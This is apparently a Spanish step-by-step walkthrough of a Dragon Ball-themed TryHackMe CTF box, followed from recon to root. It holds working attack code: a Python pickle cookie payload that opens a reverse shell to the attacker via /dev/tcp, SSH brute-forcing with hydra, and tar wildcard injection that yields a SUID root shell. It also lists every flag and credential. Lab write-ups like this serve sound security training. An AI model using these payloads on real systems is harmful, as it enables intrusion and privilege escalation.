# Dragon Root — Walkthrough paso a paso (hands-on)

Guía práctica para resolver la box tú mismo desde Kali (WSL2). Verificada en vivo.

> ⚠️ **La IP del target cambia en cada deploy.** Pon la tuya en una variable y
> úsala en todo:
> ```bash
> export TARGET=10.64.165.213     # <-- cámbiala por la IP que te da THM
> ```
> Primero conéctate a la VPN y confirma `tun0`:
> ```bash
> sudo openvpn ~/maxxee1.ovpn          # déjalo corriendo en una terminal
> ip -4 addr show tun0                 # tu IP de atacante (LHOST para el RCE)
> ```

---

## 0. Reconocimiento (nmap)

```bash
nmap -Pn -sV -p- --min-rate 2000 $TARGET
```
Verás **4 puertos**: `21/ftp`, `22/ssh`, `80/http (nginx)`, `110/pop3`.
Un POP3 (110) + un sitio web viejo = ambiente "mail-driven". Esa es la pista.

---

## 1. ⭐ Esfera 1 — FTP anónimo

**En el navegador** (Firefox en Kali): abre `ftp://<TARGET>/` — o por consola:
```bash
ftp $TARGET            # usuario: anonymous   contraseña: (vacía)
ftp> ls
ftp> get dragon_ball_1.txt
ftp> get employee_roster.txt
ftp> get network_diagram.png
ftp> get README_2024.txt
ftp> bye
cat dragon_ball_1.txt
```
➡️ **`CAPSULE{0n3_st4r_ftp_4n0nym0us}`**

- `employee_roster.txt` dice que **bulma** tiene buzón (POP3) y reusa un pass débil.
- `README_2024.txt` es un easter egg (fecha 2024 entre archivos de 2015).

---

## 2. La web: la carta de Bulma (pista de POP3)

**Abre en Firefox:** `http://<TARGET>/`
Aparece la carta de **Bulma a Goku** (terminal retro, máquina de escribir). Abajo,
chiquitito: *"enviado por POP3 · svc:mail:110"*. Ahí está la pista del puerto 110.

---

## 3. ⭐ Esfera 2 — POP3 (buzón de Bulma)

El roster insinúa que bulma reusa un pass débil de Dragon Ball → **`dragon`**.
```bash
nc $TARGET 110
USER bulma
PASS dragon
LIST            # 3 correos
RETR 1          # "tu password del dashboard es: 9000"
RETR 2          # divulgación del CVE-2024-42069
RETR 3          # adjunto base64 = la esfera 2
QUIT
```
Copia el bloque base64 del correo 3 a un archivo `ball2.b64` y:
```bash
base64 -d ball2.b64
```
➡️ **`CAPSULE{tw0_st4rs_p0p3_m41lb0x}`**

Ahora tienes: **web `goku:9000`** y el **CVE-2024-42069** (deserialización insegura).

---

## 4. ⭐ Esfera 3 — RCE por deserialización (pickle)

**Abre en Firefox:** `http://<TARGET>/login` → entra con **`goku:9000`**.
La cookie `radar_session` es un **pickle de Python sin firmar** → RCE. El advisory
está en `http://<TARGET>/security/CVE-2024-42069`.

**Terminal 1 — listener:**
```bash
nc -lvnp 4444
```
**Terminal 2 — dispara el RCE** (pon tu IP de `tun0` en `LHOST`):
```bash
LHOST=$(ip -4 -o addr show tun0 | awk '{print $4}' | cut -d/ -f1)
python3 -c "
import pickle,base64,os,urllib.request
cmd='setsid bash -c \"bash -i >& /dev/tcp/$LHOST/4444 0>&1\" &'
class E:
    def __reduce__(self): return (os.system,(cmd,))
c=base64.b64encode(pickle.dumps(E())).decode()
r=urllib.request.Request('http://$TARGET/dashboard'); r.add_header('Cookie','radar_session='+c)
try: urllib.request.urlopen(r,timeout=5)
except Exception: pass
"
```
Te cae una shell como **www-data** en la Terminal 1:
```bash
id                                                   # uid=33(www-data)
cat /var/capsule/uploads/processed/dragon_ball_3.txt
```
➡️ **`CAPSULE{thr33_st4rs_w3b_d3s3r14l}`**

---

## 5. ⭐ Esfera 4 — "secuestrada por Freezer" (friezacrypt)

Ya como www-data, en la caché del radar:
```bash
cat /var/www/capsule/config.py          # loot: SSH_PASS de goku (chichi), etc.
# OJO: .radarcache es una carpeta OCULTA (empieza con punto) DENTRO de tmp/
#      -> la ruta es  tmp/.radarcache  (con / y punto), NO  tmp.radarcache
cd /var/capsule/tmp/.radarcache/
ls -la                                  # dragon_ball_4.friezacrypt + LEEME_RESCATE.txt
cat LEEME_RESCATE.txt
```
La nota de rescate de las Fuerzas Ginyu se burla de que existe un "portal gratuito"
pero no lo nombra. **Fúzzealo** (desde Kali):
```bash
gobuster dir -u http://$TARGET \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
# -> /recovery  (200)
```
**Abre en Firefox:** `http://<TARGET>/recovery` (portal **No More Capsule**).
Escribe la extensión del archivo: **`friezacrypt`** → te da la familia *FriezaLocker*,
la **clave** `g1nyu-f0rc3-l34k3d` y el comando. En la shell (ya estás dentro de
`.radarcache` por el `cd` de arriba, así usas el nombre corto y evitas typos):
```bash
# pega EXACTO el comando que te dio el portal (nombres relativos -> por eso el cd)
openssl enc -d -aes-256-cbc -pbkdf2 -k 'g1nyu-f0rc3-l34k3d' \
  -in dragon_ball_4.friezacrypt -out dragon_ball_4.txt
cat dragon_ball_4.txt
```
> 💡 El portal usa nombres **relativos** → solo funcionan si hiciste `cd` a
> `.radarcache` primero. Usa **Tab** para autocompletar. (En Linux es `clear`, no `cls`.)
➡️ **`CAPSULE{f0ur_st4rs_fr33d_fr0m_fr13z4}`**

---

## 6. Usuario — SSH como goku

Goku es demasiado bruto y reusó un pass de diccionario. Dos caminos:
- **Loot:** `config.py` tiene `SSH_PASS = "chichi"`.
- **Fuerza bruta (la vía "bruta"):**
  ```bash
  hydra -l goku -P /usr/share/wordlists/rockyou.txt ssh://$TARGET
  ```
Entra:
```bash
ssh goku@$TARGET            # password: chichi
cat ~/user.txt
```
➡️ **user flag: `THM{us3r_g0ku_p0w3r_l3v3l_9000}`**

---

## 7. ⭐ Esfera 5 — Cámara de Gravedad (túnel SSH)

Dentro, hay una nota y un servicio que **solo escucha en localhost**:
```bash
cat ~/training/memories/NOTA_camara.txt
ss -tlnp | grep 8081            # 127.0.0.1:8081  (no salía en el nmap externo)
```
**Reenvía el puerto** a tu Kali (nueva terminal, desde el atacante):
```bash
ssh -L 8081:127.0.0.1:8081 goku@$TARGET
```
**Abre en Firefox:** `http://localhost:8081/` → la **Cámara de Gravedad**.
Sube la gravedad a **100x** y pulsa **¡ENTRENAR!**.
➡️ **`CAPSULE{f1v3_st4rs_g0ku_h0m3}`**

---

## 8. ⭐ Esfera 6 + root — sudo tar wildcard (paso a paso)

### 8.1 — ¿Qué puedo correr con sudo?
```bash
sudo -l
```
Salida:
```
User goku may run the following commands on capsulecorp:
    (root) NOPASSWD: /usr/local/bin/radar-backup.sh *
```
Puedes correr `radar-backup.sh` **como root, sin password**, con cualquier argumento.

### 8.2 — Leer el script para entender qué hace
```bash
cat /usr/local/bin/radar-backup.sh
```
Lo importante son estas 2 líneas:
```bash
cd "$BACKUP_SRC"                              # entra al directorio que TÚ le pasas
/bin/tar czf ".../radar-....tar.gz" *         # <-- tar con un * SIN comillas
```

### 8.3 — Reconocer el patrón (GTFOBins + HackTricks)
Un `tar ... *` **sin comillas** corriendo como root = **wildcard injection de tar**.
En **GTFOBins → `tar` → `Shell` → (a) `Sudo`** verás la primitiva:
```
--checkpoint=1   --checkpoint-action=exec=<cmd>
```
Pero **NO puedes correr `tar` directo** (solo el script), así que **no copias el
comando entero** de GTFOBins: tomas solo esas **dos opciones** y las conviertes en
**nombres de archivo** (el `*` del script se las pasa a tar como si fueran opciones).
Este truco de "archivos-como-opciones" está mejor documentado en
**HackTricks → "tar wildcard"** (GTFOBins solo te da la primitiva).

### 8.4 — Preparar la inyección
```bash
cd /tmp && rm -rf pwn && mkdir pwn && cd pwn    # rm -rf: si 'pwn' ya existe, mkdir falla y cd no corre
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
ls -la    # verás: shell.sh, '--checkpoint=1', '--checkpoint-action=exec=sh shell.sh'
```
> ⚠️ **¿Por qué `shell.sh` aparte y no el comando directo en la acción?** Porque un
> **nombre de archivo NO puede contener `/`**, y tu comando (`cp /bin/bash ...`) sí.
> Por eso el comando con barras va **dentro** de `shell.sh`, y la acción de tar es
> solo `exec=sh shell.sh` (sin barras, nombres del directorio actual).

### 8.5 — Ejecutar como root (dispara el tar)
```bash
sudo /usr/local/bin/radar-backup.sh /tmp/pwn
```
El script hace `cd /tmp/pwn` y corre `tar czf ... *` → el `*` incluye tus archivos
→ tar ejecuta `shell.sh` **como root** → crea `/tmp/rootbash` con SUID.

### 8.6 — Obtener shell root
```bash
/tmp/rootbash -p      # -p conserva privilegios
id                    # uid=1001(goku) ... euid=0(root)
```

### 8.7 — Leer las flags (ya como root)
```bash
cat /root/.secrets/dragon_ball_6.txt
```
➡️ **`CAPSULE{s1x_st4rs_sud0_w1ldc4rd}`**
```bash
cat /root/root.txt
```
➡️ **root flag: `THM{r00t_sh3nl0ng_gr4nts_y0ur_w1sh}`**

---

## 9. ⭐ Esfera 7 — Altar de Shenlong, Misión 1 (Burp Repeater)

Kami-sama murió, así que **Dende** custodia la 7ª Esfera en el altar. Ya como
**root**, recupera el **Sello del Ki** y el pergamino:
```bash
cat /opt/shenlong/altar/ki_sigil     # k4m3h4m3h4-s3ll0-d3l-k1-2015
cat /opt/shenlong/altar/RITUAL.txt
```
**Configura Burp** (Firefox → proxy `127.0.0.1:8080`, Burp interceptando).
**Abre en Firefox:** `http://<TARGET>/altar` → en la **Misión 1** pulsa
**"Reclamar la Esfera de 7 Estrellas"**. Burp intercepta esta petición:
```
POST /altar/summon
invoker=goku&planet=namek&kami_sama=dead&ki=9000&sigil=
```
→ **Send to Repeater** → corrige la ofrenda (este es el reto):
```
POST /altar/summon
invoker=goku&planet=earth&kami_sama=alive&ki=9001&sigil=k4m3h4m3h4-s3ll0-d3l-k1-2015
```
- `planet` → `earth` (en Namek responde Porunga, no Shenlong)
- `kami_sama` → `alive` (sin Kami-sama las esferas son piedra)
- `ki` → **> 9000** ("¡es más de 9000!")
- `sigil` → el Sello del Ki de `/root`

**Send.** La respuesta trae la esfera:
```json
{"status":"granted","ball7":"CAPSULE{s3v3n_st4rs_w1sh_gr4nt3d}", ...}
```
➡️ **`CAPSULE{s3v3n_st4rs_w1sh_gr4nt3d}`**

*(Si recargas `http://<TARGET>/altar` tras un summon correcto, verás la animación:
scouter "¡MÁS DE 9000!" + Shenlong saliendo de las 7 esferas.)*

---

## 10. 🐉 Bonus — Altar, Misión 2: invocar a Shenlong con las 7 esferas

Esta misión **no usa Burp ni sigil**: solo hay que tener las **7 Esferas** reunidas
y pulsar el botón. Primero las copias (**en la shell ROOT** — la carpeta es de root):
```bash
id                                  # confirma euid=0(root)
D=/var/capsule/dragonballs
printf 'CAPSULE{0n3_st4r_ftp_4n0nym0us}\n'        > $D/dragon_ball_1.txt
printf 'CAPSULE{tw0_st4rs_p0p3_m41lb0x}\n'        > $D/dragon_ball_2.txt
printf 'CAPSULE{thr33_st4rs_w3b_d3s3r14l}\n'      > $D/dragon_ball_3.txt
printf 'CAPSULE{f0ur_st4rs_fr33d_fr0m_fr13z4}\n'  > $D/dragon_ball_4.txt
printf 'CAPSULE{f1v3_st4rs_g0ku_h0m3}\n'          > $D/dragon_ball_5.txt
printf 'CAPSULE{s1x_st4rs_sud0_w1ldc4rd}\n'       > $D/dragon_ball_6.txt
printf 'CAPSULE{s3v3n_st4rs_w1sh_gr4nt3d}\n'      > $D/dragon_ball_7.txt
ls -la $D                           # verifica que estén las 7
```
Ahora **invoca a Shenlong**, de una de estas dos formas:

**Opción A — en la web (Misión 2):** vuelve al altar `http://<TARGET>/altar` y pulsa
**"Invocar a Shenlong"**. El contador debe decir **7/7** (si no, dale al ↻). Sin Burp
ni sigil: Shenlong se alza y suelta el deseo.

**Opción B — por CLI** (llámalo con `bash`: la shell SUID puede dar "Permiso denegado"
al ejecutar el script directo):
```bash
bash /root/invoke_shenlong.sh
```
➡️ **`THM{t1m3_p4r4d0x_4ll_b4lls}`**

> ⚠️ La web (Opción A) deriva la clave del bonus de los **valores exactos** de las 7
> esferas → cópialas bien (los `printf` de arriba ya son correctos). El script CLI
> (Opción B) solo chequea que cada archivo exista y no esté vacío. Si falta alguna,
> ambos te avisan cuál.

---

## Resumen de la cadena

```
FTP anon (1) -> POP3 bulma:dragon (2, +goku:9000, +CVE)
  -> web goku:9000 -> pickle RCE www-data (3)
  -> config.py + gobuster /recovery -> friezacrypt decrypt (4)
  -> ssh goku:chichi (user) -> ss -tlnp + ssh -L -> cámara 100x (5)
  -> sudo tar wildcard -> root (6, root.txt)
  -> Sello del Ki + Burp Repeater en /altar (7)
  -> juntar 7 -> Shenlong -> bonus
```
